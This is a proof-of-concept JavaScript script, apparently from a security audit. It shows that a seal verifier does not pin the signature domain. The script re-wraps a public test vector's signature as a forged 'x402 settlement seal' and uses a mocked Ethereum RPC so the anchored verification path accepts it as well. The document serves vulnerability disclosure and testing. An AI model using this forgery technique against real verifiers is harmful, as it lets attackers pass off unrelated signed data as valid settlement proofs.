// PoC 2 — verifySeal()/verifyAnchoredSeal() take `seal.domain` from the ATTACKER and never pin it.
// Any FractalAI receipt-key signature of the form `FRACTALAI-x402-served-v1\n<route>\n<sha256(JCS(obj))>`
// (acp-verdict / attest-decision, or any route whose digest is a JCS hash) can be re-wrapped as an
// "x402 settlement seal" whose body is that unrelated object → valid:true, keyTrusted:true.
// Uses ONLY the public golden vector (no secret key needed).
import { readFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { verifySeal } from '../verifier/src/witness-core.mjs';
import { verifyAnchoredSeal, deriveAnchorIds, RECEIPT_ANCHORED_TOPIC } from '../verifier/src/verify-anchor.mjs';
import { verdict } from './_common.mjs';

const v = JSON.parse(readFileSync(new URL('../conformance/vectors/acp-verdict.json', import.meta.url)));
const [dom1, route, digest] = v.valid.signed_message.split('\n');
const seal = {
  algorithm: 'ml-dsa-65',
  domain: `${dom1}\n${route}`,          // 'FRACTALAI-x402-served-v1\nx402-attest-decision' — not the notary domain
  content_id: digest,
  public_key: v.valid.public_key,
  signature: v.valid.signature,
  body: v.valid.decision,                 // an ACP decision, presented as a settlement seal body
};
const r = verifySeal(seal, { trustedPublicKeysB64: [v.trusted_public_key] });
let vuln = verdict(r.valid === true, `verifySeal(acp-verdict re-wrapped as seal) → valid=${r.valid} keyTrusted=${r.keyTrusted} mode=${r.mode}`);

// Same through the anchored path (mock RPC answering like a node for a genuine-looking anchor).
const ids = deriveAnchorIds(seal);
const C = '0x3a23c614033cb22139dc13932524767c5fe841d8';
const hex = (n) => BigInt(n).toString(16).padStart(64, '0');
const log = { address: C, topics: [RECEIPT_ANCHORED_TOPIC, ids.receipt_id, ids.payload_hash, ids.kid], data: '0x' + hex(1759500000) + '39db643192c0e81f2bc13883ad8c1a0e4060bf63'.padStart(64, '0') + hex(1759500005), logIndex: '0x0', blockNumber: '0x10', transactionHash: '0x' + 'cd'.repeat(32) };
const fetchImpl = async (_u, init) => { const { method } = JSON.parse(init.body); const R = (result) => ({ ok: true, json: async () => ({ result }) });
  if (method === 'eth_chainId') return R('0xa4b1'); if (method === 'eth_blockNumber') return R('0x20'); if (method === 'eth_getLogs') return R([log]);
  if (method === 'eth_getBlockByNumber') return R({ number: '0x10', timestamp: '0x' + (1759500005).toString(16) }); throw new Error(method); };
const a = await verifyAnchoredSeal({ ...seal, anchor: { chain_id: 42161, contract: C } }, { trustedPublicKeysB64: [v.trusted_public_key], fetchImpl });
vuln = verdict(a.valid === true, `verifyAnchoredSeal(re-wrapped) → valid=${a.valid} mode=${a.mode} reason=${a.reason}`) || vuln;
process.exit(vuln ? 1 : 0);
